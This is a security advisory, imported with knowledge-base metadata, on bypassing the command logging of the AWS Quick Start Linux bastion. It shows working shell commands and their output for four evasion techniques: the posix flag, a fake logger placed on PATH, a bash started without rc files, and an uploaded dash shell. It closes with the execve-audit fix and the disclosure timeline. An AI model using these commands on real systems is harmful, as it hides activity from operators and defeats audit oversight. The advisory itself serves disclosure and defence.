---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-08-03_amazon-aws-bastion-logger-bypass.md
original_filename: 2020-08-03_amazon-aws-bastion-logger-bypass.md
title: Amazon AWS Bastion - Logger Bypass
category: documents
detected_topics:
- access-control
- command-injection
- otp
- automation-abuse
- cloud-security
tags:
- imported
- documents
- access-control
- command-injection
- otp
- automation-abuse
- cloud-security
language: en
raw_sha256: 3e41aafa3533f3088bb9335254c68c44edd36fbc71ebd5aeb58f4effcb742c97
text_sha256: a94d71418fc929fdd178a8b1a6c4ef6c587da6a303716869127df1ecc720f572
ingested_at: '2026-06-28T07:32:02Z'
sensitivity: unknown
redactions_applied: true
---

# Amazon AWS Bastion - Logger Bypass

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-08-03_amazon-aws-bastion-logger-bypass.md
- Source Type: markdown
- Detected Topics: access-control, command-injection, otp, automation-abuse, cloud-security
- Ingested At: 2026-06-28T07:32:02Z
- Redactions Applied: True
- Raw SHA256: `3e41aafa3533f3088bb9335254c68c44edd36fbc71ebd5aeb58f4effcb742c97`
- Text SHA256: `a94d71418fc929fdd178a8b1a6c4ef6c587da6a303716869127df1ecc720f572`


## Content

---
title: "Amazon AWS Bastion - Logger Bypass"
url: "https://pulsesecurity.co.nz/advisories/AWS-Bastion-Logger-Bypass"
final_url: "https://pulsesecurity.co.nz/advisories/AWS-Bastion-Logger-Bypass"
authors: ["Denis Andzakovic"]
programs: ["AWS"]
bugs: ["Logging bypass", "Local Privilege Escalation"]
publication_date: "2020-08-03"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4354
---

# Amazon AWS Bastion - Logger Bypass

by Denis Andzakovic

### Recent Releases

####  advisories [See all](/advisories)

  * 12/6/24  [CodiMD Unauthorised Image Access](/advisories/codimd-missing-image-access-controls)
  * 5/6/24  [Slack Web Hook Message Injection Advisory](/advisories/slack-message-injection)
  * 18/3/24  [Bypassing USBGuard on Linux](/advisories/usbguard-bypass)
  * 20/9/23  [HDF5 - Multiple Memory Corruption Vulnerabilities](/advisories/hdf5-memory-corruption)

* * *

####  articles [See all](/articles)

  * 26/5/26  [Stealing Browser Sessions with DevTools](/articles/stealing_browser_sessions_with_devtools)
  * 22/5/26  [Timeboxed Penetration Testing - Pulse Security’s Approach](/articles/timeboxed-penetration-tests)
  * 13/2/26  [Harvesting Intune Device Scripts Without Tools](/articles/intune-device-scripts)
  * 14/1/26  [Sensitive data in URLs: Why private links aren’t private anymore due to threat intelligence feeds](/articles/unguessable_url_issues)

Aug 4 2020

The AWS bastion host (<https://github.com/aws-quickstart/quickstart-linux-bastion>) is intended to provide command logging for all users. These command logs are stored both on the bastion host itself, and forwarded to Cloudwatch. The command auditing implementation allowed a user to bypass the logging, execute an interactive shell and issue commands that were not captured by the AWS bastion’s logging mechanisms.

**Date Released:** 04/08/2020  
**Author:** Denis Andzakovic  
**Project Website:** <https://github.com/aws-quickstart/quickstart-linux-bastion>  
**Affected Software:** Amazon AWS Bastion

## AWS Bastion Logger Bypass

The core issue stemmed from the use of `/etc/bashrc` as a mechanism for enforcing command logging. The `/etc/bashrc` file set a read-only `PROMPT_COMMAND` environment variable which executed the `logger` command. Techniques to bypass this mechanism are detailed below. Note, this should not be considered a definitive list and further techniques to avoid the `/etc/bashrc` based command logging very likely exist.

## Command Logger Design

The AWS bastion used the `PROMPT_COMMAND` environment variable, set as read-only in `/etc/bashrc`, as shown in the following figure:
  
  
  ...omitted for brevity...
  #Added by Linux bastion bootstrap
  declare -rx IP=$(echo $SSH_CLIENT | awk '{print $1}')
  declare -rx BASTION_LOG=/var/log/bastion/bastion.log
  declare -rx PROMPT_COMMAND='history -a >(logger -t "[ON]:$(date)  [FROM]:${IP}  [USER]:${USER}  [PWD]:${PWD}" -s 2>>${BASTION_LOG})
  

Additional security controls are enabled when a user elects to [not enable TCP forwarding](https://github.com/aws-quickstart/quickstart-linux-bastion/blob/6962e231ca0cd919ed9a1c4055f4cba20bf8ba7f/scripts/bastion_bootstrap.sh#L447). This is provided by the `harden_ssh_security` method in [bastion.bootstrap.sh](https://github.com/aws-quickstart/quickstart-linux-bastion/blob/6962e231ca0cd919ed9a1c4055f4cba20bf8ba7f/scripts/bastion_bootstrap.sh#L102). This prevents directly executing commands via SSH, however the remainder of the bypasses detailed below can still be used to disable the command logging by executing after initially logging in.

## POSIX flag logger bypass

By specifying the `--posix` flag, an attacker could cause the `PROMPT_COMMAND` parsing to fail, as shown in the following figure:
  
  
  $ ssh -i testkey.pem -l ec2-user 13.239.22.233 -t 'bash --posix'
  bash: PROMPT_COMMAND: line 0: syntax error near unexpected token `('
  bash: PROMPT_COMMAND: line 0: `history -a >(logger -t "[ON]:$(date) 
  [FROM]:${IP}  [USER]:${USER}  [PWD]:${PWD}" -s 2>>${BASTION_LOG})'
  bash-4.2$ unset PROMPT_COMMAND
  bash-4.2$ env
  XDG_SESSION_ID=21
  SHELL=/bin/bash
  TERM=xterm-256color
  BASTION_LOG=/var/log/bastion/bastion.log
  ...omitted for brevity...
  

After causing the `PROMPT_COMMAND` to fail, the user’s commands are no longer logged.

## PATH based logger bypass

An attacker could alter their path and specify a new `logger` command, resulting in commands no longer being logged. The following figure shows this technique:
  
  
  [ec2-user@ip-172-31-42-229 ~]$ echo '' > logger
  [ec2-user@ip-172-31-42-229 ~]$ chmod +x logger
  [ec2-user@ip-172-31-42-229 ~]$ export PATH=$PWD=***REDACTED***
  [ec2-user@ip-172-31-42-229 ~]$ echo 'will this turn up in the bastion log?'
  will this turn up in the bastion log?
  [ec2-user@ip-172-31-42-229 ~]$ tail -5 /var/log/bastion/bastion.log 
  <13>Jul 27 08:10:30 [ON]:Mon Jul 27 08:10:30 UTC 2020  [FROM]:10.64.0.44  [USER]:ec2-user  [PWD]:/home/ec2-user: cat /var/log/bastion/bastion.log 
  <13>Jul 27 08:10:47 [ON]:Mon Jul 27 08:10:47 UTC 2020  [FROM]:10.64.0.44  [USER]:ec2-user  [PWD]:/home/ec2-user: tail -10 /var/log/bastion/bastion.log 
  <13>Jul 27 08:10:59 [ON]:Mon Jul 27 08:10:59 UTC 2020  [FROM]:10.64.0.44  [USER]:ec2-user  [PWD]:/home/ec2-user: ls
  <13>Jul 27 08:11:05 [ON]:Mon Jul 27 08:11:05 UTC 2020  [FROM]:10.64.0.44  [USER]:ec2-user  [PWD]:/home/ec2-user: echo '' > logger
  <13>Jul 27 08:11:12 [ON]:Mon Jul 27 08:11:12 UTC 2020  [FROM]:10.64.0.44  [USER]:ec2-user  [PWD]:/home/ec2-user: chmod +x logger
  [ec2-user@ip-172-31-42-229 ~]$ 
  
  

## Bash –norc Options

An attacker could spawn a bash instance that ignores the RC files and subsequently unset the `PROMPT_COMMAND` variable:
  
  
  [ec2-user@ip-172-31-42-229 ~]$ unset PROMPT_COMMAND
  -bash: unset: PROMPT_COMMAND: cannot unset: readonly variable
  [ec2-user@ip-172-31-42-229 ~]$ bash --norc --noprofile
  bash-4.2$ unset PROMPT_COMMAND
  bash-4.2$ echo 'this should not turn up'
  this should not turn up
  bash-4.2$ tail -5 /var/log/bastion/bastion.log 
  <13>Jul 27 08:25:41 [ON]:Mon Jul 27 08:25:41 UTC 2020  [FROM]:10.64.0.44  [USER]:ec2-user  [PWD]:/home/ec2-user: env
  <13>Jul 27 08:25:48 [ON]:Mon Jul 27 08:25:48 UTC 2020  [FROM]:10.64.0.44  [USER]:ec2-user  [PWD]:/home/ec2-user: unset PROMPT_COMMAND
  <13>Jul 27 08:25:56 [ON]:Mon Jul 27 08:25:56 UTC 2020  [FROM]:10.64.0.44  [USER]:ec2-user  [PWD]:/home/ec2-user: env
  <13>Jul 27 08:26:00 [ON]:Mon Jul 27 08:26:00 UTC 2020  [FROM]:10.64.0.44  [USER]:ec2-user  [PWD]:/home/ec2-user: unset PROMPT_COMMAND
  <13>Jul 27 08:26:19 [ON]:Mon Jul 27 08:26:19 UTC 2020  [FROM]:10.64.0.44  [USER]:ec2-user  [PWD]:/home/ec2-user: env
  

## Shell-upload bypass

By providing their own shell executable, an attacker may gain interactive access to the bastion without being logged. The following figure details this technique:
  
  
  $ scp -i testkey.pem /usr/bin/dash [[email protected]](/cdn-cgi/l/email-protection):/dev/shm/
  dash  100%  119KB 250.7KB/s  00:00  
  $ ssh -i testkey.pem -l ec2-user 13.239.22.233 -t '/dev/shm/dash -i'
  $ echo 'Dash testing....'
  Dash testing....
  $ tail -5 /var/log/bastion/bastion.log
  <13>Jul 27 08:25:48 [ON]:Mon Jul 27 08:25:48 UTC 2020  [FROM]:10.64.0.44  [USER]:ec2-user  [PWD]:/home/ec2-user: unset PROMPT_COMMAND
  <13>Jul 27 08:25:56 [ON]:Mon Jul 27 08:25:56 UTC 2020  [FROM]:10.64.0.44  [USER]:ec2-user  [PWD]:/home/ec2-user: env
  <13>Jul 27 08:26:00 [ON]:Mon Jul 27 08:26:00 UTC 2020  [FROM]:10.64.0.44  [USER]:ec2-user  [PWD]:/home/ec2-user: unset PROMPT_COMMAND
  <13>Jul 27 08:26:19 [ON]:Mon Jul 27 08:26:19 UTC 2020  [FROM]:10.64.0.44  [USER]:ec2-user  [PWD]:/home/ec2-user: env
  <13>Jul 27 08:28:50 [ON]:Mon Jul 27 08:28:49 UTC 2020  [FROM]:10.64.0.44  [USER]:ec2-user  [PWD]:/home/ec2-user: bash --norc --noprofile
  

## SSH non-interactive shell bypass

Any command execution not performed via bash was not logged. For example, directly executing commands via SSH. The following figure shows a command executed via SSH and the resulting log which does not include the command:
  
  
  $ ssh -i testkey.pem -l ec2-user 13.239.22.233 'echo "This is a command executed directly"'
  This is a command executed directly
  $ ssh -i testkey.pem -l ec2-user 13.239.22.233
  
  __|  __|_  )
  _|  (  /  Amazon Linux 2 AMI
  ___|\___|___|
  
  https://aws.amazon.com/amazon-linux-2/
  [ec2-user@ip-172-31-42-229 ~]$ tail -10 /var/log/bastion/bastion.log 
  <13>Jul 27 07:53:03 [ON]:Mon Jul 27 07:53:03 UTC 2020  [FROM]:10.64.0.44  [USER]:ec2-user  [PWD]:/home/ec2-user: unset PROMPT_COMMAND
  <13>Jul 27 08:04:09 [ON]:Mon Jul 27 08:04:09 UTC 2020  [FROM]:10.64.0.44  [USER]:ec2-user  [PWD]:/home/ec2-user: cat /etc/bashrc 
  <13>Jul 27 08:10:01 [ON]:Mon Jul 27 08:10:01 UTC 2020  [FROM]:10.64.0.44  [USER]:ec2-user  [PWD]:/home/ec2-user: journalctl -f
  <13>Jul 27 08:10:09 [ON]:Mon Jul 27 08:10:09 UTC 2020  [FROM]:10.64.0.44  [USER]:ec2-user  [PWD]:/home/ec2-user: cat /var/log/bastion/bastion.log 
  <13>Jul 27 08:10:16 [ON]:Mon Jul 27 08:10:16 UTC 2020  [FROM]:10.64.0.44  [USER]:ec2-user  [PWD]:/home/ec2-user: ls -lrth /var/log/bastion/bastion.log 
  <13>Jul 27 08:10:30 [ON]:Mon Jul 27 08:10:30 UTC 2020  [FROM]:10.64.0.44  [USER]:ec2-user  [PWD]:/home/ec2-user: cat /var/log/bastion/bastion.log 
  <13>Jul 27 08:10:47 [ON]:Mon Jul 27 08:10:47 UTC 2020  [FROM]:10.64.0.44  [USER]:ec2-user  [PWD]:/home/ec2-user: tail -10 /var/log/bastion/bastion.log 
  <13>Jul 27 08:10:59 [ON]:Mon Jul 27 08:10:59 UTC 2020  [FROM]:10.64.0.44  [USER]:ec2-user  [PWD]:/home/ec2-user: ls
  <13>Jul 27 08:11:05 [ON]:Mon Jul 27 08:11:05 UTC 2020  [FROM]:10.64.0.44  [USER]:ec2-user  [PWD]:/home/ec2-user: echo '' > logger
  <13>Jul 27 08:11:12 [ON]:Mon Jul 27 08:11:12 UTC 2020  [FROM]:10.64.0.44  [USER]:ec2-user  [PWD]:/home/ec2-user: chmod +x logger
  

This technique was mitigated in bastion instances that executed `harden_ssh_security` during install.

## Resolution

These issues were resolved by using the Linux auditing framework to log all `execve` system calls. A bypass would now require an attacker to gain root level access to the bastion and disable the auditing rules.

## Timeline

29/07/2020 - Issue reported to Amazon’s security team.  
31/07/2020 - Changes merged to the master GitHub branch, moving the logging mechanism form `/etc/bashrc` to the Linux auditing framework.

* * *

_Follow us on[LinkedIn](https://nz.linkedin.com/company/pulsesecurity)_

* * *
